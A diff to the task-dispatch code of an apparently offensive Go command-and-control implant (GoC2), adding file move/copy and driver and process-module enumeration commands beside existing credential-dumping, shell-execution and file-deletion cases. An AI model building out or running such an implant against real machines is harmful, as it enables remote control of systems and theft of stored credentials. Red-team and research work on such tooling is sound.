@@ -22,7 +22,9 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/credentials/dumpcredman"
 	"github.com/latortuga71/GoC2/internal/modules/credentials/dumpprocess"
 	"github.com/latortuga71/GoC2/internal/modules/credentials/dumpsecrets"
+	"github.com/latortuga71/GoC2/internal/modules/enumeration/enumdrivers"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/enumlocaluser"
+	"github.com/latortuga71/GoC2/internal/modules/enumeration/enummodules"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/env"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/ifconfig"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/listports"
@@ -167,6 +169,10 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = basic.DeleteDirectory(t.Args[0])
 	case "rm":
 		result, cmdError = basic.DeleteFile(t.Args[0])
+	case "mv":
+		result, cmdError = basic.MoveFile(t.Args)
+	case "cp":
+		result, cmdError = basic.CopyFile(t.Args)
 	case "killproc":
 		result, cmdError = basic.KillProcess(t.Args[0])
 	case "ifconfig":
@@ -317,7 +323,10 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = basic.ShellCommand(t.Args[0])
 	case "dump-credential-mgr":
 		result, cmdError = dumpcredman.DumpCredman(t.Args[0])
-
+	case "enum-drivers":
+		result, cmdError = enumdrivers.EnumerateDrivers()
+	case "enum-modules":
+		result, cmdError = enummodules.EnumProcessModules(t.Args[0])
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
